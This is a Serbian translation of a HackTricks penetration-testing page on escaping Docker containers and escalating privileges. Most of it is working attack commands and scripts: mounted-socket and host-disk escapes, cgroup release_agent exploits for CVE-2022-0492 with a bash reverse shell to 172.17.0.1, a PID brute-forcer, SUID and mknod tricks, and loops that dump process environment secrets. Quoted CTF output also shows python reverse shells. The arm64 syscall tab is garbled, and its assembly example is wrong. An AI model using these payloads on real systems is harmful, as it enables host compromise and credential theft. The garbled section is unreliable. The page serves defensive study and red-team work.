# Docker Breakout / Eskalacija privilegija

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Automatsko nabrojavanje i bekstvo

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Može takođe **nabrojati kontejnere**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Ovaj alat je prilično **koristan za nabrojavanje kontejnera u kojem se nalazite, pa čak i za automatsko bekstvo**
* [**amicontained**](https://github.com/genuinetools/amicontained): Koristan alat za dobijanje privilegija koje kontejner ima kako biste pronašli načine za bekstvo iz njega
* [**deepce**](https://github.com/stealthcopter/deepce): Alat za nabrojavanje i bekstvo iz kontejnera
* [**grype**](https://github.com/anchore/grype): Dobijte CVE-ove koji se nalaze u softveru instaliranom na slici

## Bekstvo iz montiranog Docker Socket-a

Ako na neki način otkrijete da je **Docker Socket montiran** unutar Docker kontejnera, moći ćete da pobegnete iz njega.\
Ovo se obično dešava u Docker kontejnerima koji iz nekog razloga moraju da se povežu sa Docker daemonom radi izvršavanja radnji.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
U ovom slučaju možete koristiti redovne docker komande za komunikaciju sa docker daemonom:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Ukoliko je **docker socket na neočekivanom mestu**, i dalje možete komunicirati sa njim koristeći **`docker`** komandu sa parametrom **`-H unix:///path/to/docker.sock`**
{% endhint %}

Docker daemon takođe može [slušati na portu (podrazumevano 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ili na sistemima zasnovanim na Systemd-u, komunikacija sa Docker daemonom može se odvijati preko Systemd socket-a `fd://`.

{% hint style="info" %}
Dodatno, obratite pažnju na runtime socket-e drugih visokog nivoa runtime-ova:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Zloupotreba privilegija za bekstvo

Trebali biste proveriti privilegije kontejnera, ako ima neku od sledećih, možda ćete moći da pobegnete iz njega: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Trenutne privilegije kontejnera možete proveriti koristeći **prethodno pomenute automatske alate** ili:
```bash
capsh --print
```
Na sledećoj stranici možete **saznati više o Linux sposobnostima** i kako ih zloupotrebiti da biste pobegli/escalirali privilegije:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Bekstvo iz privilegovanih kontejnera

Privilegovani kontejner može biti kreiran sa zastavicom `--privileged` ili onemogućavanjem određenih odbrana:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Zastavica `--privileged` značajno smanjuje sigurnost kontejnera, omogućavajući **neograničen pristup uređajima** i zaobilazeći **nekoliko zaštita**. Za detaljnije informacije, pogledajte dokumentaciju o potpunim uticajima `--privileged` zastavice.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privilegovani + hostPID

Sa ovim dozvolama možete jednostavno **preći u namespace procesa koji se izvršava na hostu kao root**, kao što je init (pid:1), samo pokretanjem: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testirajte to u kontejneru izvršavanjem:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegovani

Samo sa privilegovanom zastavicom možete pokušati **pristupiti disku domaćina** ili pokušati **izbeći zloupotrebu release\_agenta ili drugih bekstava**.

Testirajte sledeće zaobilaženja u kontejneru izvršavanjem:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montiranje diska - Poc1

Dobro konfigurisani Docker kontejneri neće dozvoliti komandu poput **fdisk -l**. Međutim, na loše konfigurisanoj Docker komandi gde je specificiran flag `--privileged` ili `--device=/dev/sda1` sa privilegijama, moguće je dobiti privilegije za pregled host drajva.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Dakle, da preuzmemo kontrolu nad host mašinom, to je trivijalno:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
I eto! Sada možete pristupiti datotečnom sistemu domaćina jer je montiran u fascikli `/mnt/hola`.

#### Montiranje diska - Poc2

Unutar kontejnera, napadač može pokušati da dobije dalji pristup osnovnom operativnom sistemu domaćina putem hostPath volumena koji je kreiran od strane klastera. U nastavku su neke uobičajene stvari koje možete proveriti unutar kontejnera da biste videli da li koristite ovaj vektor napada:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privilegovano bekstvo zloupotrebom postojećeg release\_agenta ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Početni PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Zloupotreba privilegija putem kreiranja release\_agenta ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Drugi PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Pronađite **objašnjenje tehnike** u:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Privilegovano izbegavanje korišćenjem release\_agent-a bez poznavanja relativne putanje - PoC3

U prethodnim eksploatacijama je **otkrivena apsolutna putanja kontejnera unutar hosts fajl sistema**. Međutim, to nije uvek slučaj. U situacijama kada **ne znate apsolutnu putanju kontejnera unutar hosta** možete koristiti ovu tehniku:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Izvršavanje PoC-a unutar privilegovanog kontejnera trebalo bi pružiti sličan izlaz:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Zloupotreba privilegija putem osetljivih montaža

Postoji nekoliko datoteka koje mogu biti montirane i koje pružaju **informacije o osnovnom hostu**. Neke od njih čak mogu ukazivati na **nešto što će biti izvršeno od strane hosta kada se nešto dogodi** (što će omogućiti napadaču da pobegne iz kontejnera).\
Zloupotreba ovih datoteka može omogućiti:

* release\_agent (već obrađeno ranije)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Međutim, možete pronaći **druge osetljive datoteke** koje treba proveriti na ovoj stranici:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Proizvoljne montaže

U nekoliko situacija ćete primetiti da je **kontejner montirao neki volumen sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći **pristupiti/izmeniti osetljive podatke**: Čitati tajne, menjati ssh authorized\_keys...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Eskalacija privilegija sa 2 školjke i host montažom

Ako imate pristup kao **root unutar kontejnera** koji ima neki folder sa hosta montiran i uspeli ste da pobegnete kao neprivilegovani korisnik na hostu i imate pristup za čitanje preko montiranog foldera.\
Možete kreirati **bash suid fajl** u **montiranom folderu** unutar **kontejnera** i **izvršiti ga sa hosta** kako biste izvršili eskalaciju privilegija.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Eskalacija privilegija sa 2 školjke

Ako imate pristup kao **root unutar kontejnera** i uspeli ste da **izađete kao korisnik bez privilegija na hostu**, možete iskoristiti obe školjke da biste **eskaliarali privilegije na hostu** ako imate mogućnost MKNOD unutar kontejnera (što je podrazumevano) kao što je [**objašnjeno u ovom postu**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Sa takvom mogućnošću, korisnik root unutar kontejnera ima dozvolu da **kreira blok uređajne fajlove**. Uređajni fajlovi su posebni fajlovi koji se koriste za **pristupanje hardveru i jezgrovim modulima**. Na primer, blok uređajni fajl /dev/sda omogućava pristup **čitanju sirovih podataka na sistemskom disku**.

Docker štiti od zloupotrebe blok uređajnih fajlova unutar kontejnera primenom cgroup politike koja **blokira operacije čitanja/pisanja blok uređaja**. Međutim, ako se blok uređaj kreira unutar kontejnera, postaje dostupan izvan kontejnera putem direktorijuma **/proc/PID/root/**. Pristup zahteva da **vlasnik procesa bude isti** i unutar i izvan kontejnera.

Primer **eksploatacije** iz ovog [**izveštaja**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Ako možete pristupiti procesima domaćina, moći ćete pristupiti mnogim osetljivim informacijama koje se čuvaju u tim procesima. Pokrenite testnu laboratoriju:
```
docker run --rm -it --pid=host ubuntu bash
```
Na primer, moći ćete da izlistate procese koristeći nešto poput `ps auxn` i pretražite osetljive detalje u komandama.

Zatim, pošto možete **pristupiti svakom procesu na hostu u /proc/ možete samo ukrasti njihove tajne iz okruženja** pokretanjem:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Možete takođe **pristupiti file deskriptorima drugih procesa i čitati njihove otvorene fajlove**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Takođe možete **ubiti procese i izazvati DoS**.

{% hint style="warning" %}
Ako na neki način imate privilegovan **pristup procesu van kontejnera**, možete pokrenuti nešto poput `nsenter --target <pid> --all` ili `nsenter --target <pid> --mount --net --pid --cgroup` da **pokrenete shell sa istim ns ograničenjima** (nadam se bez ograničenja) **kao taj proces**.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Ako je kontejner konfigurisan sa Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), mrežni stek tog kontejnera nije izolovan od Docker hosta (kontejner deli mrežni namespace sa hostom) i kontejner ne dobija dodeljenu sopstvenu IP adresu. Drugim rečima, **kontejner direktno vezuje sve servise za IP adresu hosta**. Osim toga, kontejner može **interceptirati SAV mrežni saobraćaj koji host šalje i prima na deljenoj interfejsu `tcpdump -i eth0`**.

Na primer, možete koristiti ovo da **snimate i čak falsifikujete saobraćaj** između hosta i instance metapodataka.

Kao u sledećim primerima:

* [Writeup: Kako kontaktirati Google SRE: Ubacivanje školjke u cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM omogućava eskalaciju privilegija (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Takođe ćete moći da pristupite **mrežnim servisima vezanim za localhost** unutar hosta ili čak pristupite **dozvolama metapodataka čvora** (koje mogu biti različite od onih koje kontejner može da pristupi).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) domaćina, kao što je **deljena memorija** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih procesa domaćina ili podova. Koristite `ipcs` da biste dalje pregledali ove IPC mehanizme.

* **Pregledajte /dev/shm** - Potražite datoteke na ovoj lokaciji deljene memorije: `ls -la /dev/shm`
* **Pregledajte postojeće IPC objekte** - Možete proveriti da li se koriste neki IPC objekti sa `/usr/bin/ipcs`. Proverite sa: `ipcs -a`

### Vraćanje privilegija

Ako syscall **`unshare`** nije zabranjen, možete povratiti sve privilegije pokretanjem:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Zloupotreba korisničkog imenskog prostora putem simboličkih veza

Druga tehnika objašnjena u postu [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) pokazuje kako možete zloupotrebiti bind montaže sa korisničkim imenskim prostorima da biste uticali na datoteke unutar hosta (u tom specifičnom slučaju, brisanje datoteka).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** koji se pokreću najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE-ovi

### Runc eksploatacija (CVE-2019-5736)

U slučaju da možete izvršiti `docker exec` kao root (verovatno sa sudo), možete pokušati da eskalirate privilegije bežeći iz kontejnera zloupotrebom CVE-2019-5736 (eksploatacija [ovde](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ova tehnika će u osnovi **prepisati** binarnu datoteku _**/bin/sh**_ na **hostu** **iz kontejnera**, tako da bilo ko ko izvršava docker exec može pokrenuti payload.

Promenite payload prema potrebi i izgradite main.go sa `go build main.go`. Dobijeni binarni fajl treba da se postavi u docker kontejner radi izvršavanja.\
Prilikom izvršavanja, čim prikaže `[+] Overwritten /bin/sh successfully`, trebate izvršiti sledeće sa host mašine:

`docker exec -it <container-name> /bin/sh`

Ovo će pokrenuti payload koji se nalazi u fajlu main.go.

Za više informacija: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Postoje i drugi CVE-ovi na koje kontejner može biti ranjiv, možete pronaći listu na [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Prilagođeno bekstvo iz Docker-a

### Površina bekstva iz Docker-a

* **Imenski prostori**: Proces treba da bude **potpuno odvojen od drugih procesa** putem imenskih prostora, tako da ne možemo izbeći interakciju sa drugim procesima zbog imenskih prostora (podrazumevano ne može komunicirati putem IPC-a, Unix soketa, mrežnih servisa, D-Bus-a, `/proc` drugih procesa).
* **Root korisnik**: Podrazumevano, korisnik koji pokreće proces je root korisnik (međutim, njegove privilegije su ograničene).
* **Ovlašćenja**: Docker ostavlja sledeća ovlašćenja: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Sistemski pozivi**: Ovo su sistemski pozivi koje **root korisnik neće moći da pozove** (zbog nedostatka ovlašćenja + Seccomp). Ostali sistemski pozivi mogu se koristiti za pokušaj bekstva.

{% tabs %}
{% tab title="x64 sistemski pozivi" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

## arm64 syscalls

arm64 syscalls are defined in the `arch/arm64/include/uapi/asm/unistd.h` file in the Linux kernel source code. These syscalls provide a way for user-space programs to interact with the kernel and perform privileged operations.

To call a syscall in arm64, you need to use the `svc` instruction with the syscall number in the `x8` register and the syscall arguments in the `x0` to `x7` registers. The result of the syscall is returned in the `x0` register.

Here is an example of how to call the `open` syscall in arm64:

```assembly
mov x8, #2   // syscall number for open
mov x0, #0   // file path (null terminated string)
mov x1, #0   // flags
mov x2, #0   // mode
svc #0      // call the syscall
```

You can find the syscall numbers for arm64 in the `arch/arm64/include/uapi/asm/unistd.h` file. Each syscall is assigned a unique number, which you can use to call the syscall.

It's important to note that calling syscalls directly in your code should be done with caution, as it can lead to security vulnerabilities. It's recommended to use the standard library functions or system calls wrappers provided by the operating system whenever possible.

{% endtab %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

